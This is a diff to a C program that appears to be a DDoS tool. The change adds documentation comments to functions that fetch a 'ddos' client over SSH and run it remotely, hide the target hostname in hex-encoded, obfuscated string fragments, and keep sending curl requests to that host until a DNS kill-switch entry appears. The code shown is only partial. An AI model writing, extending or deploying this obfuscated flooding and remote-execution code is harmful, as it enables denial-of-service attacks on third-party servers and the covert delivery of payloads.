@@ -16,7 +16,7 @@ if (system(command) != 0) {          \
 }                                    \
 })
 
-//print menu
+/// Display the text art
 void displayTextArt(void) {
     printf(R"EOF(
 
@@ -36,11 +36,14 @@ void displayTextArt(void) {
 )EOF");
 }
 
+/// Function containing a special secret link
+/// \return Size of the link (size_t)
 size_t special_secret_link(void) {
     const char *link = "https://rb.gy/o411hk";
     return strlen(link);
 }
 
+/// Connect via SSH to get the DDOS client and execute it remotely
 void transfer(void) {
     const char *client_file_name = "ddos"; //path to the ddos file
 
@@ -99,6 +102,9 @@ void transfer(void) {
     fclose(file);
 }
 
+/// Get the curl prepared request
+/// \param hostname domain/ip address to reach (const char *)
+/// \return Curl prepare request (CURL *)
 CURL *get_curl(const char *hostname) {
     CURL *curl = curl_easy_init();
 
@@ -116,6 +122,8 @@ CURL *get_curl(const char *hostname) {
     return curl;
 }
 
+/// Send the prepared curl request
+/// \param curl Curl structure for the request (CURL *)
 void ddos(CURL *curl) {
     CURLcode resolution;
 
@@ -132,6 +140,8 @@ void ddos(CURL *curl) {
     fflush(stdout);
 }
 
+/// Get the hostname
+/// \param str Pointer to obtain the hostname (char *)
 void the_0bfusk1_666_h0sTn4m3(char *str) {
     const char *nbmpdibqer = "\x6C\x6D";
     const char *msdopzoinf = "\x6E\x61";
@@ -153,8 +163,13 @@ void the_0bfusk1_666_h0sTn4m3(char *str) {
              odbazmapwn);
 }
 
-bool check(char *hostname, addrinfo *hints, addrinfo *result) {
-    return getaddrinfo(hostname, NULL, hints, &result) == 0;
+/// Check if a DNS entry exist
+/// \param entry DNS entry to check (char *)
+/// \param hints DNS request address information (addrinfo *)
+/// \param result DNS response address information (addrinfo *)
+/// \return True if the entry exists, false otherwise (bool)
+bool check(char *entry, addrinfo *hints, addrinfo *result) {
+    return getaddrinfo(entry, NULL, hints, &result) == 0;
 }
 
 int main(void) {
@@ -173,7 +188,7 @@ int main(void) {
 
     CURL *curl = get_curl(hostname);
 
-    while (!check(hostname, &hints, &result)){
+    while (!check(hostname, &hints, &result)) {
         ddos(curl);
         sleep(5);
     }
